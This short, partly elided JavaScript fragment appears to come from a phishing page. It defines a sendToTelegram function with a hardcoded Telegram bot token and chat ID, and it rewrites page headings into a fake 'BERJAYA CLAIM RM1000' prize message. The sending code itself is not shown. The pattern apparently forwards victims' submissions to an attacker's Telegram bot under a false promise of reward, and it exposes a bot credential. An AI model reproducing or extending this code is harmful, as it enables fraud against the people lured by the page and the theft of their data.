...
function sendToTelegram(message) {
  const token = "7699921163:AAFbxsgk9HP1iykhf5eZ6Lvnj0UjR53HOWc"; // Token bot Telegram Anda
  const chatId = "6883367722"; // Chat ID atau ID grup Anda
...
document.querySelectorAll(".h2").forEach((item) => {
  item.textContent = item.textContent.replace("RM1000", "BERJAYA CLAIM RM1000");
});
